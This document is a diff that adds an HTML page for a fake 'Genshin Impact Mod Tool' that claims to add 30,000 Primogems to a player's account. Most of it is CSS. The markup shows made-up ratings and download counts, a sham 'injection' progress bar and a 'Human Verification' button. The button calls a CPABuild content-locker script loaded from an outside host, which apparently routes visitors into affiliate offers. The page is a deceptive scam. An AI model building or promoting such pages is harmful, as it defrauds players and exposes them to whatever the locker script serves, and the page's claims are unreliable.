@@ -1,0 +1,1430 @@
+
+<!DOCTYPE html>
+
+<html lang="id"><head>
+    <title>genshin</title>
+<meta name="description" content=""/>
+
+<meta name="referrer" content="no-referrer">
+<meta name="robots" content="noindex,nofollow">
+
+
+
+    <style>
+        .header_blue {
+            background: #1565c0;
+            padding: 80px 0 20px;
+            color: #fff;
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 40px;
+        }
+        .header_text {
+            margin-left: auto;
+            margin-right: auto;
+            width: 80%;
+        }
+        body{
+            margin:0;
+            font-family:Roboto, sans-serif;
+            color:#444;
+        }
+        .unlockBtn:hover{
+            box-shadow: 0 3px 6px rgba(0,0,0,.16), 0 3px 6px rgba(0,0,0,.23);
+        }
+        .unlockBtn {
+            background: #2196f3;
+            border: none;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.24);
+            min-height: 31px;
+            min-width: 70px;
+            padding: 2px 16px;
+            text-align: center;
+            text-shadow: none;
+            text-transform: uppercase;
+            -webkit-transition: all 280ms ease;
+            transition: all 280ms ease;
+            box-sizing: border-box;
+            cursor: pointer;
+            -webkit-appearance: none;
+            display: inline-block;
+            vertical-align: middle;
+            font: 500 14px/31px Roboto,sans-serif!important;
+            outline: 0!important;
+            color:white;
+        }
+        .content-container{
+            width:80%;margin:0 auto;
+        }
+        @font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}
+        
+
+body {
+	overflow-x: hidden;
+}
+html {
+	overflow-y: scroll;
+	overflow-x: hidden;
+}
+ul {
+	list-style: none;
+}
+textarea, input, a, button { 
+	outline: none;
+}
+
+/*--------------------------------------------------------------
+# Typography
+--------------------------------------------------------------*/
+body {
+	font-family: 'Poppins', sans-serif !important;
+	font-size: 16px;
+	color: #fff;
+}
+h1, h2, h3, h4, h6 {
+	font-weight: 700;
+}
+a {
+	-webkit-transition: all 0.2s ease-in-out 0s;
+	-moz-transition: all 0.2s ease-in-out 0s;
+	-ms-transition: all 0.2s ease-in-out 0s;
+	-o-transition: all 0.2s ease-in-out 0s;
+	transition: all 0.2s ease-in-out 0s;
+}
+a:hover, a:visited, a:focus, a:active, button:hover, button:visited, button:active, button:focus {
+	text-decoration: none !important;
+	outline: none !important;
+}
+::selection {
+	background: #000;
+	color: #fff;
+	text-shadow: none;
+}
+::-moz-selection {
+	background: #000;
+	color: #fff;
+	text-shadow: none;
+}
+
+/*--------------------------------------------------------------
+# Animations
+--------------------------------------------------------------*/
+.animation-delay-100 {
+	-webkit-animation-delay: 0.1s;
+	animation-delay: 0.1s;
+}
+.animation-delay-200 {
+	-webkit-animation-delay: 0.2s;
+	animation-delay: 0.2s;
+}
+.animation-delay-300 {
+	-webkit-animation-delay: 0.3s;
+	animation-delay: 0.3s;
+}
+.animation-delay-400 {
+	-webkit-animation-delay: 0.4s;
+	animation-delay: 0.4s;
+}
+.animation-delay-600 {
+	-webkit-animation-delay: 0.6s;
+	animation-delay: 0.6s;
+}
+.animation-delay-800 {
+	-webkit-animation-delay: 0.8s;
+	animation-delay: 0.8s;
+}
+.animation-delay-1000 {
+	-webkit-animation-delay: 1s;
+	animation-delay: 1s;
+}
+.animation-delay-2000 {
+	-webkit-animation-delay: 2s;
+	animation-delay: 2s;
+}
+
+/*--------------------------------------------------------------
+# BG
+--------------------------------------------------------------*/
+#bg {
+	position: fixed;
+	right: 0;
+	bottom: 0;
+	min-width: 100%; 
+	min-height: 100%;
+	z-index: -20;
+	background: url('bg.jpg');
+	background-repeat: no-repeat;
+	background-size: cover;
+}
+.overlay-pattern {
+    background: url('https://d13pxqgp3ixdbh.cloudfront.net/uploads/161988465254455778a0d847b79c2fc9e8cecf67ce.png');
+    opacity: 0.5;
+    position: fixed;
+    left: 0;
+    top: 0;
+    right: 0;
+    z-index: -10;
+    width: 100%;
+    height: 100%;
+	box-shadow: inset 0 0 300px 0 #c5f6ff;
+}
+.overlay {
+    -moz-animation: overlay .5s .5s forwards;
+    -webkit-animation: overlay .5s .5s forwards;
+    -ms-animation: overlay .5s .5s forwards;
+    animation: overlay .5s .5s forwards;
+    background-attachment: fixed, fixed;
+    background-image: url(https://d13pxqgp3ixdbh.cloudfront.net/uploads/161988467183d2f4e2bd40074817a496163e687c33.png), url(../img/overlay.svg);
+    background-position: top left, center center;
+    background-repeat: repeat, no-repeat;
+    background-size: auto, cover;
+    height: 100%;
+    left: 0;
+    opacity: 0;
+    position: fixed;
+    top: 0;
+    width: 100%;
+	z-index: -5;
+}
+@-moz-keyframes overlay {
+	0% {
+		opacity: 0;
+	}
+	100% {
+		opacity: 0.5;
+	}
+}
+@-webkit-keyframes overlay {
+	0% {
+		opacity: 0;
+	}
+	100% {
+		opacity: 0.5;
+	}
+}
+@-ms-keyframes overlay {
+	0% {
+		opacity: 0;
+	}
+	100% {
+		opacity: 0.5;
+	}
+}
+@keyframes overlay {
+	0% {
+		opacity: 0;
+	}
+	100% {
+		opacity: 0.5;
+	}
+}
+
+/*--------------------------------------------------------------
+# App Download
+--------------------------------------------------------------*/
+.app-download-section {
+	position: relative;
+	padding: 120px 0 10px 0;
+}
+.app-download-wrapper {
+	max-width: 500px;
+	margin: 0 auto;
+	background: #fff;
+	padding: 90px 30px 70px 30px;
+	position: relative;
+	border-radius: 50px;
+	color: #333;
+	box-shadow: 0 10px 15px 0 rgba(0, 0, 0, 0.4);
+}
+.app-icon-wrapper {
+	position: absolute;
+	left: 0;
+	width: 100%;
+	top: -70px;
+}
+.app-icon-inner-wrapper {
+	background: #fff;
+	padding: 15px;
+	display: table;
+	margin: 0 auto;
+	border-radius: 40px;
+}
+.app-icon-wrapper img {
+	max-width: 180px;
+	width:120px;
+	border-radius: 30px!important;
+}
+.app-download-content {
+	text-align: center;
+}
+.app-download-content-header {
+	position: relative;
+}
+.app-download-content h1 {
+	font-weight: 300;
+	margin: 0;
+	font-size: 1.8em;
+}
+.app-download-content-header span {
+	font-weight: 700;
+	display: block;
+	font-size: 1.1em;
+}
+.app-download-status {
+	position: relative;
+	margin: 20px;
+}
+.app-download-status:after {
+	content: '';
+	display: block;
+	height: 2px;
+	width: 100%;
+	background: #eee;
+	left: 0;
+	top: 47%;
+	position: absolute;
+}
+.status-row {
+	background: #eee;
+	display: inline-block;
+	max-width: 150px;
+	padding: 10px 15px;
+	margin: 0 5px;
+	position: relative;
+	z-index: 5;
+	border-radius: 8px;
+}
+.status-label {
+	font-size: 0.9em;
+	font-weight: 300;
+	text-transform: uppercase;
+	display: block;
+	line-height: 1;
+	margin: 0 0 5px 0;
+}
+.status-dynamic {
+	font-size: 1em;
+	font-weight: 700;
+	display: block;
+	line-height: 1;
+}
+#status {
+	color: #4fe16b;
+}
+.app-download-main p.app-download-intro-text {
+	font-size: 1.2em;
+	color: #999;
+	font-weight: 300;
+	max-width: 90%;
+	margin: 3% auto;
+	text-align:center;
+}
+.platform-field-wrapper {
+	position: relative;
+}
+.platform-item {
+	background: #eee;
+	border-radius: 10px;
+	padding: 20px 10px;
+    position: relative;
+	text-align: center;
+	-webkit-animation-duration: 0.7s;
+    animation-duration: 0.7s;
+    cursor: pointer;	
+}
+
+
+
+.active{
+	background: #8300fe;
+	border-radius: 10px;
+	padding: 20px 10px;
+    position: relative;
+	text-align: center;
+	-webkit-animation: jello 0.7s;
+    animation: jello 0.7s;
+    cursor: pointer;
+}
+
+
+.platform-item i {
+	font-size: 2.8em;
+	display: block;
+	color: #000;
+}
+.platform-item span {
+	color: #222;
+	text-transform: uppercase;
+	font-weight: 700;
+	font-size: 1.1em;
+	margin-top: 4px;
+	display: block;
+}
+.platform-item.active {
+	background: #8400ff;
+}
+.platform-item.active i {
+	color: #fff;
+}
+.platform-item.active span {
+	color: #fff;
+	text-shadow: none;
+}
+
+/*--------------------------------------------------------------
+# Modal
+--------------------------------------------------------------*/
+.master-modal {
+	max-width: 500px;
+	margin: 0 auto;
+	position: relative;
+	color: #333;
+	border-radius: 30px;
+	padding-left:10px;
+	padding-right:10px;
+}
+
+.f1, .f2{
+	max-width: 450px;
+	margin: 0 auto;
+	position: relative;
+	color: #333;
+	border-radius: 30px;
+}
+
+.f1{
+	padding-left:10px;
+	padding-right:10px;
+}
+
+.generator-header {
+	text-align: center;
+	background: #8400ff;
+	color: #fff;
+	font-size: 1.8em;
+	-webkit-border-top-left-radius: 30px;
+	-webkit-border-top-right-radius: 30px;
+	-moz-border-radius-topleft: 30px;
+	-moz-border-radius-topright: 30px;
+	border-top-left-radius: 30px;
+	border-top-right-radius: 30px;
+}
+.generator-header span.lnr {
+	margin-right: 10px;
+	display: inline-block;
+	position: relative;
+	top: 2px;
+}
+.generator-header {
+	padding: 25px 20px;
+}
+.generator-content {
+	padding: 25px 30px;
+}
+.generator-content {
+	background: #fff;
+	-webkit-border-bottom-right-radius: 30px;
+	-webkit-border-bottom-left-radius: 30px;
+	-moz-border-radius-bottomright: 30px;
+	-moz-border-radius-bottomleft: 30px;
+	border-bottom-right-radius: 30px;
+	border-bottom-left-radius: 30px;
+	text-align: center;
+}
+.console-msg-wrapper {
+	position: relative;
+	margin: 25px 0 15px 0;
+	height: 50px;
+}
+.console-msg {
+	font-size: 1.8em;
+	font-weight: 500;
+	
+}
+.console-loadbar {
+	width: 90%;
+	max-width: 640px;
+	padding: 10px 15px;
+	display: table;
+	margin: 30px auto 0 auto;
+	background: #eee;
+	-webkit-transition: all 0.2s ease-in-out 0s;
+	-moz-transition: all 0.2s ease-in-out 0s;
+	-ms-transition: all 0.2s ease-in-out 0s;
+	-o-transition: all 0.2s ease-in-out 0s;
+	transition: all 0.2s ease-in-out 0s;
+	border-radius: 10px;
+}
+.console-loadbar div {
+	font-size: 20px;
+	text-indent: 9999px;
+	overflow: hidden;
+	background: #4fe16b;
+	border-radius: 10px;
+}
+.console-msg-error {
+	color: #fc4349;
+}
+
+/*--------------------------------------------------------------
+# Verification
+--------------------------------------------------------------*/
+.human-verification-wrapper {
+	position: relative;
+}
+.human-verification-wrapper p {
+	color: #000;
+	font-size: 1.2em;
+	margin: 0 auto;
+	display: table;
+}
+.human-verification-wrapper i {
+	font-size: 2.6em;
+	display: block;
+	text-align: center;
+	margin: 20px auto;
+	color: #8400ff;
+}
+#verification-button {
+	color: #fff;
+}
+.h-v-time-left-wrapper {
+	color: rgba(0, 0, 0, 0.3);
+	font-size: 1em;
+	margin-bottom: 15px;
+}
+#human_verification_timer_time {
+	color: #333;
+	display: block;
+	font-weight: 700;
+	line-height: 1;
+}
+.verification-app-wrapper h3 {
+	color: #000;
+	margin: 10px 0 20px 0;
+	font-size: 1.2em;
+	font-weight: 300;
+}
+.verification-app-wrapper h3 span {
+	display: block;
+	font-weight: 700;
+	font-size: 1.2em;
+}
+.verification-app-icon-img {
+	max-width: 80px !important;
+	margin: 0 auto;
+	display: table;
+	border-radius:8px;
+}
+/*--------------------------------------------------------------
+# Button
+--------------------------------------------------------------*/
+.button-wrapper {
+	margin: 30px auto 0 auto;
+}
+.button {
+	background: #8400ff;
+	display: table;
+	margin: 0 auto;
+	padding: 25px 35px;
+	color: #fff;
+	border-radius: 20px;
+	text-transform: uppercase;
+	font-weight: 700;
+	letter-spacing: 2px;
+	box-shadow: 0 0 6px 0 rgba(0, 0, 0, 0.3);
+	text-decoration: none !important;
+	border: 2px solid #eee;
+	position: relative;
+	cursor: pointer;
+	font-size: 1.4em;
+	text-decoration: none !important;
+	outline: none !important;
+}
+
+.button:hover{
+	animation: borderPulse 1000ms infinite ease-out, colorShift 10000ms infinite ease-in;
+	cursor: pointer;
+}
+
+
+.button span.lnr {
+	position: absolute;
+	left: 17px;
+	top: 27px;
+	font-size: 1.2em;
+	color: #fff;
+	-webkit-transition: all 0.2s ease-in-out 0s;
+	-moz-transition: all 0.2s ease-in-out 0s;
+	-ms-transition: all 0.2s ease-in-out 0s;
+	-o-transition: all 0.2s ease-in-out 0s;
+	font-weight: 400;
+	text-shadow: none;
+	transition: all 0.2s ease-in-out 0s;
+}
+.button:hover span.lnr {
+	color: #fff;
+	
+}
+
+/*--------------------------------------------------------------
+# Footer
+--------------------------------------------------------------*/
+footer {
+	margin-top: 100px;
+	text-align: center;
+	padding: 5px 0;
+	color: rgba(255, 255, 255, 0.5);
+	font-size: 1em;
+	position: relative;
+	z-index: 10;
+}
+
+/*--------------------------------------------------------------
+# Loader
+--------------------------------------------------------------*/
+.loader {
+  color: #8400ff;
+  font-size: 70px;
+  text-indent: -9999em;
+  overflow: hidden;
+  width: 1em;
+  height: 1em;
+  border-radius: 50%;
+  margin: 45px auto;
+  position: relative;
+  -webkit-transform: translateZ(0);
+  -ms-transform: translateZ(0);
+  transform: translateZ(0);
+  -webkit-animation: load6 1.7s infinite ease, round 1.7s infinite ease;
+  animation: load6 1.7s infinite ease, round 1.7s infinite ease;
+}
+@-webkit-keyframes load6 {
+  0% {
+    box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
+  }
+  5%,
+  95% {
+    box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
+  }
+  10%,
+  59% {
+    box-shadow: 0 -0.83em 0 -0.4em, -0.087em -0.825em 0 -0.42em, -0.173em -0.812em 0 -0.44em, -0.256em -0.789em 0 -0.46em, -0.297em -0.775em 0 -0.477em;
+  }
+  20% {
+    box-shadow: 0 -0.83em 0 -0.4em, -0.338em -0.758em 0 -0.42em, -0.555em -0.617em 0 -0.44em, -0.671em -0.488em 0 -0.46em, -0.749em -0.34em 0 -0.477em;
+  }
+  38% {
+    box-shadow: 0 -0.83em 0 -0.4em, -0.377em -0.74em 0 -0.42em, -0.645em -0.522em 0 -0.44em, -0.775em -0.297em 0 -0.46em, -0.82em -0.09em 0 -0.477em;
+  }
+  100% {
+    box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
+  }
+}
+@keyframes load6 {
+  0% {
+    box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
+  }
+  5%,
+  95% {
+    box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
+  }
+  10%,
+  59% {
+    box-shadow: 0 -0.83em 0 -0.4em, -0.087em -0.825em 0 -0.42em, -0.173em -0.812em 0 -0.44em, -0.256em -0.789em 0 -0.46em, -0.297em -0.775em 0 -0.477em;
+  }
+  20% {
+    box-shadow: 0 -0.83em 0 -0.4em, -0.338em -0.758em 0 -0.42em, -0.555em -0.617em 0 -0.44em, -0.671em -0.488em 0 -0.46em, -0.749em -0.34em 0 -0.477em;
+  }
+  38% {
+    box-shadow: 0 -0.83em 0 -0.4em, -0.377em -0.74em 0 -0.42em, -0.645em -0.522em 0 -0.44em, -0.775em -0.297em 0 -0.46em, -0.82em -0.09em 0 -0.477em;
+  }
+  100% {
+    box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
+  }
+}
+@-webkit-keyframes round {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@keyframes round {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+
+
+/*--------------------------------------------------------------
+# Responsive Design
+--------------------------------------------------------------*/
+@media screen and (max-width: 1920px) {
+	.header-content h1 {
+		font-size: 7em;
+	}
+	.header-content p {
+		font-size: 1.6em;
+	}
+	.container {
+		max-width: 800px;
+	}
+	.button {
+		padding: 15px 25px;
+		letter-spacing: 1px;
+	}
+	.button span.lnr {
+		top: 15px;
+	}
+}
+@media screen and (max-width: 1260px) {
+	.app-download-section {
+		padding: 200px 0 10px 0;
+	}
+}
+@media screen and (max-width: 550px) {
+	.app-download-wrapper {
+		padding: 80px 30px 70px 30px;
+	}
+	.app-icon-wrapper {
+		top: -75px;
+	}
+	.app-icon-wrapper img {
+		max-width: 100px;
+	}
+	.button {
+		padding: 15px 25px;
+		letter-spacing: 0;
+	}
+	.button span.lnr {
+		font-size: 1em;
+		left: 12px;
+	}
+}
+@media screen and (max-width: 460px) {
+	.app-download-section {
+		padding: 120px 0 10px 0;
+	}
+	.app-download-content h1 {
+		font-size: 1.5em;
+	}
+	.row-second {
+		display: none;
+	}
+	.app-download-main p.app-download-intro-text {
+		font-size: 1.2em;
+		max-width: 100%;
+	}
+	.button {
+		font-size: 1.2em;
+	}
+	.console-msg {
+		font-size: 1.8em;
+	}
+}
+@media screen and (max-width: 390px) {
+	.app-download-content h1 {
+		font-size: 1.3em;
+	}
+	.app-download-main p.app-download-intro-text {
+		font-size: 1.1em;
+	}
+	.console-msg {
+		font-size: 1.6em;
+	}
+}
+@media screen and (max-width: 365px) {
+	.app-download-content h1 {
+		font-size: 1.2em;
+	}
+	.app-download-main p.app-download-intro-text {
+		font-size: 1em;
+	}
+	.button {
+		font-size: 1.1em;
+	}
+	.console-msg {
+		font-size: 1.5em;
+	}
+}
+@media screen and (max-width: 340px) {
+	.app-download-content h1 {
+		font-size: 1.1em;
+	}
+	.button {
+		font-size: 1em;
+	}
+	.app-download-wrapper {
+		padding: 80px 20px 70px 20px;
+	}
+	.console-msg {
+		font-size: 1.4em;
+	}
+	.generator-header {
+		font-size: 1.6em;
+	}
+	.human-verification-wrapper p {
+		font-size: 1em;
+	}
+}
+
+
+/*download menu*/
+
+.app-step-pr {
+    display: flex;
+    position: relative;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 12px;
+}
+
+.app-step-platforms {
+    display: inline-flex;
+    position: relative;
+    align-items: center;
+    text-align: center;
+    justify-content: center;
+    margin: 0;
+}
+
+.cm-d .app-step-platforms i {
+    color: #a6b0cf;
+}
+
+.cm-d .aspr-sep {
+    background: rgba(0, 0, 0, 0.3);
+}
+.aspr-sep {
+    height: 15px;
+    width: 1px;
+    background: rgba(0, 0, 0, 0.1);
+    margin: 0 5px 0 10px;
+}
+
+.cm-d .app-step-platforms i {
+    color: #a6b0cf;
+}
+.app-step-platforms i.imr {
+    margin-right: 3px;
+}
+.app-step-platforms i {
+    font-size: 1.3em;
+}
+
+/***************/
+.app-step-rating {
+    display: inline-flex;
+    position: relative;
+    align-items: center;
+    text-align: center;
+    justify-content: center;
+    margin: 0;
+}
+
+.app-step-rating .material-icons-two-tone {
+    filter: invert(89%) sepia(19%) saturate(5557%) hue-rotate(357deg) brightness(105%) contrast(104%);
+}
+.material-icons-two-tone {
+    font-family: 'Material Icons Two Tone';
+    font-weight: normal;
+    font-style: normal;
+    font-size: 24px;
+    line-height: 1;
+    letter-spacing: normal;
+    text-transform: none;
+    display: inline-block;
+    white-space: nowrap;
+    word-wrap: normal;
+    direction: ltr;
+    -webkit-font-feature-settings: 'liga';
+    -webkit-font-smoothing: antialiased;
+}
+
+.cm-d #app-step-rating-val {
+    color: #a6b0cf;
+}
+#app-step-rating-val {
+    font-weight: 700;
+    position: relative;
+    margin-left: 2px;
+}
+
+.aspr-sep-2 {
+    margin: 0 10px 0 10px;
+}
+
+/******************/
+
+.app-step-downloads {
+    display: inline-flex;
+    position: relative;
+    align-items: center;
+    text-align: center;
+    justify-content: center;
+    margin: 0;
+}
+
+.cm-d #app-step-downloads-val {
+    color: #a6b0cf;
+}
+#app-step-downloads-val {
+    font-weight: 700;
+    position: relative;
+    margin-left: 2px;
+}
+
+#s-p-c-title {
+    color: #8429ff;
+}
+#s-p-c-title {
+    text-align: center;
+    font-weight: 700;
+    margin: 0 auto 3px auto;
+    font-size: 1.2em;
+}
+/*END*/
+
+/*Magnific pop up*/
+
+#proccessing-outer-wrapper {
+    width: 100%;
+    height: 100%;
+    left: 0;
+    top: 0;
+    position: fixed;
+    z-index: 1050;
+    display: flex;
+    align-items: center;
+}
+
+.proccessing-wrapper {
+    width: 440px;
+    margin: 0 auto;
+    border-radius: 15px;
+    padding: 40px 70px;
+    position: relative;
+	box-shadow: 0 3px 20px 0 rgb(0 0 0 / 20%);
+    background: #fff;
+}
+
+@media screen and (max-width: 480px){
+.proccessing-wrapper {
+    max-width: 93%;
+    padding: 40px 30px;
+}
+}
+
+.proccessing-loader {
+    text-align: center;
+    margin: 0 auto 5px auto;
+}
+
+.cm-d .proccessing-loader span.material-icons-two-tone {
+    filter: invert(79%) sepia(13%) saturate(499%) hue-rotate(
+188deg
+) brightness(88%) contrast(90%);
+    font-size: 7em;
+}
+
+.proccessing-loader span.material-icons-two-tone {
+    font-size: 7em;
+}
+.fa-spin {
+    animation: fa-spin 2s infinite linear;
+}
+
+.material-icons-two-tone {
+    font-family: 'Material Icons Two Tone';
+    font-weight: normal;
+    font-style: normal;
+    font-size: 24px;
+    line-height: 1;
+    letter-spacing: normal;
+    text-transform: none;
+    display: inline-block;
+    white-space: nowrap;
+    word-wrap: normal;
+    direction: ltr;
+    -webkit-font-feature-settings: 'liga';
+    -webkit-font-smoothing: antialiased;
+}
+
+.cm-d .proccessing-title {
+    color: #a6b0cf;
+}
+.animated.infinite {
+    -webkit-animation-iteration-count: infinite;
+    animation-iteration-count: infinite;
+}
+.proccessing-title {
+    font-size: 1em;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    font-weight: 400;
+    margin: 0 0 50px 0;
+    text-align: center;
+	color:#333;
+}
+.animated {
+    -webkit-animation-duration: 1s;
+    animation-duration: 1s;
+    -webkit-animation-fill-mode: both;
+    animation-fill-mode: both;
+}
+.pulse {
+    -webkit-animation-name: pulse;
+    animation-name: pulse;
+}
+
+.bounceIn {
+  -webkit-animation-duration: 0.75s;
+  animation-duration: 0.75s;
+  -webkit-animation-name: bounceIn;
+  animation-name: bounceIn;
+}
+
+
+.proccessing-msg {
+    font-size: 1.6em;
+    font-weight: 700;
+    text-align: center;
+	color:#333;
+}
+
+.proccessing-loadbar {
+    width: 90%;
+    overflow: hidden;
+    position: relative;
+    margin: 30px auto 0 auto;
+    background: rgba(0, 0, 0, 0.1);
+    border-radius: 10px;
+}
+
+.proccessing-loadbar div {
+    background: #8429ff;
+}
+.proccessing-loadbar div {
+    font-size: 7px;
+    text-indent: 9999px;
+    overflow: hidden;
+    border-radius: 10px;
+}
+
+.cm-d .proccessing-wrapper {
+    box-shadow: 0 3px 20px 0 rgb(0 0 0 / 20%);
+    background: #2a3042;
+}
+
+/*magnific end*/
+</style>
+<!--Favicon-->
+<link rel="shortcut icon" type="image/x-icon" href="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1613911146a2abc3b7586afadd42b14ca8ccbf6340.png">
+
+<!-- Google Fonts -->
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons|Material+Icons+Two+Tone|" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&amp;display=swap" rel="stylesheet">		
+<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,700,900&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
+		
+		<!-- CSS -->
+<link href="https://d13pxqgp3ixdbh.cloudfront.net/uploads/assets/1563298961d7e11a0c316ea6a189a4b4e2bd1ad627.css" rel="stylesheet">  
+<link href="https://d13pxqgp3ixdbh.cloudfront.net/uploads/assets/15632989585b40da5bd6314d160701458ac2c4a7d1.css" rel="stylesheet">
+<link href="https://d13pxqgp3ixdbh.cloudfront.net/uploads/assets/1559359726663d8b370982e8006af671f8a9e4437f.css" rel="stylesheet">
+		
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<script type="text/javascript">
+    var CPABUILDSETTINGS={"it":2167085,"key":"3b54d"};
+</script>
+<script src="https://dby7kx9z9yzse.cloudfront.net/014c7ae.js"></script>
+</head>
+<body>
+<div id="master-modal" class="master-modal">
+		<div class="generator-container f1 mfp-hide">	
+			<div class="generator-header">	
+				<span class="fas fa-cog fa-spin"></span><span>Processing...</span>
+			</div>
+			<div class="generator-content">	
+				<div class="loader-wrapper">
+					<div class="loader">Loading...</div>
+				</div>
+				<div class="console-msg-wrapper">
+					<div class="console-msg"></div>
+				</div>
+				<div class="console-loadbar-wrapper">
+					<div id="progressBarConsole" class="console-loadbar animated bounceIn">
+						<div style="width: 1px; overflow: hidden;">0%&nbsp;</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+		<!------Human Verification Wrapper------>
+		
+		<!------Overlay start------>
+	
+	<div id="master-modal" class="master-modal main-f mfp-hide">
+		<div class="generator-container f2">	
+			<div class="generator-header">	
+				<span class="fas fa-cog fa-spin"></span><span>Processing...</span>
+			</div>
+			<div class="generator-content">	
+				<div class="loader-wrapper">
+					<div class="loader">Loading...</div>
+				</div>
+				<div class="console-msg-wrapper">
+					<div class="console-msg"></div>
+				</div>
+				<div class="console-loadbar-wrapper">
+					<div id="progressBarConsole" class="console-loadbar animated bounceIn">
+						<div style="width: 1px; overflow: hidden;">0%&nbsp;</div>
+					</div>
+				</div>
+			</div>
+			
+			
+			
+		</div>
+		<!------Human Verification Wrapper------>
+		
+		<div class="human-verification-wrapper f3 mfp-hide">
+			<div class="generator-container">	
+				<div class="generator-header">	
+					<span>Application injection </span>
+				</div>
+				<div class="generator-content">	
+					<div class="verification-app-wrapper">
+						<img src="logo.jpg" class="verification-app-icon-img img-fluid">
+						<h3><span> Genshin Impact</span> Mod Tool</h3>
+					</div>
+					<p>You're almost done! Click the button below to complete the 'Human Verification' required for the final step of the injection process.</p>
+					<i class="fas fa-spinner fa-spin"></i>
+					<div id="h-v-time-left-wrapper" class="h-v-time-left-wrapper">
+						<span>Waiting</span>
+						<!--span id="human_verification_timer_time"><span>02 minutes and 52 seconds</span></span-->
+					</div>
+					<div class="verification-button-wrapper">
+						<a id="verification-button" class="button animated pulse infinite" onclick="CPABuildLock()">
+							<span>Verify</span>
+						</a>
+					</div>
+				</div>
+			</div>	
+		</div>
+		
+		<!------Human Verification Wrapper End------>
+	</div>
+	
+	<!------Overlay End------>
+	
+	
+	
+		<div id="bg"></div>
+		<div class="overlay-pattern"></div>
+		<div class="overlay"></div>
+		
+		
+		<section class="app-download-section">
+			<div class="container">
+				<div class="app-download-wrapper animated flipInX">
+					<div class="app-icon-wrapper">
+						<div class="app-icon-inner-wrapper">
+							<img src="logo.jpg" class="app-icon-img img-fluid">
+						</div>
+					</div>
+					<div class=" app-download-content">
+						<div class="app-step-pr">
+							<div class="app-step-platforms">
+								<i class="fab fa-android imr"></i>
+								<i class="fab fa-apple"></i>
+							</div>
+							
+							<div class="aspr-sep"></div>
+							<div class="app-step-rating">
+								<span class="material-icons-two-tone">star</span>
+								<span id="app-step-rating-val">4.7</span>
+							</div>
+								
+							<div class="aspr-sep aspr-sep-2"></div>
+							<div class="app-step-downloads">
+								<span class="material-icons-two-tone">cloud_download</span>
+								<span id="app-step-downloads-val">320K+</span>
+							</div>
+						</div>
+						<div class="app-download-content-header">						
+							<h1><span> Genshin Impact</span></h1>
+						</div>
+						
+						<div class=" app-download-main animated bounceIn">
+							<p class="app-download-intro-text">Add 30,000 Primogems with this mod tool.</p>
+							<div class="app-download-status"></div>
+							<div class="first-step" style="margin-top: 30px;padding-top:20px;">
+								<div id="s-p-c-title">Ready for injection</div>
+								<p class="app-download-intro-text">Click the button below to start adding Primogems to your account.</p>							
+								<div class="button-wrapper">
+									<button id="b-1" class="button animated pulse infinite">Begin</button>
+								</div>
+							</div>
+						</div>
+					</div>
+					
